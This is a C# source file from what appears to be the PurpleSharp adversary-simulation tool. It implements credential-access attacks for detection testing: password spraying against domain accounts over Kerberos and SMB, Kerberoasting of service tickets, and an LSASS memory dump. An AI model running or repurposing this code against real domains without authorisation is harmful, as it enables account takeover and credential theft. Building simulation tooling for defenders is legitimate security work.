using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    public class CredAccess
    {

        public static void LocalDomainPasswordSpray(int nuser, int sleep, string password, string log)
        {

            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1110");
            logger.TimestampInfo(String.Format("Local Domain Brute Force"));
            bool Kerberos = new bool();
            try
            {
                var rand = new Random();
                int usertype = rand.Next(1, 7);
                List<User> usertargets = Lib.Targets.GetUserTargets(usertype, nuser);
                int protocol = rand.Next(1, 3);
                switch (protocol)
                {
                    case 1:
                        Kerberos = true;
                        break;

                    case 2:
                        Kerberos = false;
                        break;

                    default:
                        return;
                }
                logger.TimestampInfo(String.Format("Obtained {0} user accounts", usertargets.Count));
                if (sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", sleep));
                String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                if (usertype == 6) domain = ".";

                foreach (var user in usertargets)
                {
                    if (Kerberos)
                    {

                        CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 0, logger);
                        if (sleep > 0) Thread.Sleep(sleep * 1000);
                    }
                    else
                    {
                        CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 2, logger);
                        if (sleep > 0) Thread.Sleep(sleep * 1000);
                    }
                }
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void RemotePasswordSpray(int nhost, int nuser, int sleep, string password, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1110");
            logger.TimestampInfo(String.Format("Remote Domain Brute Force"));
            bool Kerberos = new bool();
            List<Computer> targets = new List<Computer>();
            List<User> targetusers = new List<User>();
            List<Task> tasklist = new List<Task>();
            string  domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            
            try
            {
                var rand = new Random();
                int usertype = rand.Next(1, 7);
                if (usertype == 6) domain = ".";
                int protocol = rand.Next(1, 3);

                logger.TimestampInfo(String.Format("Querying LDAP for random targets..."));

                int computertype = rand.Next(1, 5);
                targets = Lib.Targets.GetHostTargets(computertype, nhost);
                logger.TimestampInfo(String.Format("Obtained {0} target computers", targets.Count));
                targetusers = Lib.Targets.GetUserTargets(usertype, nuser);
                logger.TimestampInfo(String.Format("Obtained {0} target user accounts", targetusers.Count));
                
                switch (protocol)
                {
                    case 1:
                        Kerberos = true;
                        break;

                    case 2:
                        //using NTLM
                        Kerberos = false;
                        break;

                    default:
                        return;
                }
                if (sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", sleep));

                int type = rand.Next(1, 3);
                if (type == 1)
                {
                    //Remote spray against a random target host
                    var random = new Random();
                    int index = random.Next(targets.Count);
                    logger.TimestampInfo(String.Format("Picking {0} as a target", targets[index].ComputerName));
                    foreach (User user in targetusers)
                    { 
                        User tempuser = user;
                        int tempindex = index;
                        if (sleep > 0 && tempindex > 0) Thread.Sleep(sleep * 1000);
                        
                        tasklist.Add(Task.Factory.StartNew(() =>
                        {
                            CredAccessHelper.RemoteSmbLogin(targets[tempindex], domain, tempuser.UserName, password, Kerberos, logger);
                        }));

                    }
                    Task.WaitAll(tasklist.ToArray());

                }
                else if (type == 2)
                {
                    //Remote spray against several hosts, distributed
                    int loops;
                    if (targetusers.Count >= targets.Count) loops = targets.Count;
                    else loops = targetusers.Count;

                    for (int i = 0; i < loops; i++)
                    {
                        int temp = i;
                        if (sleep > 0 && temp > 0) Thread.Sleep(sleep * 1000);
                        tasklist.Add(Task.Factory.StartNew(() =>
                        {
                            CredAccessHelper.RemoteSmbLogin(targets[temp], domain, targetusers[temp].UserName, password, Kerberos, logger);

                        }));
                    }
                    Task.WaitAll(tasklist.ToArray());

                }
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void Kerberoasting(string log, int sleep)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1208");
            if (sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between each service ticket request", sleep));

            try
            {
                //NetworkCredential cred = null;
                List<String> spns;
                spns = Ldap.GetSPNs();

                foreach (String spn in spns)
                {
                    Lib.SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
                    if (sleep > 0) Thread.Sleep(sleep * 1000);
                }
                logger.SimulationFinished();

            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }
        public static void LsassMemoryDump(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1003");
            try
            {
                CredAccessHelper.LsassMemoryDump(logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
            
        }

    }
}

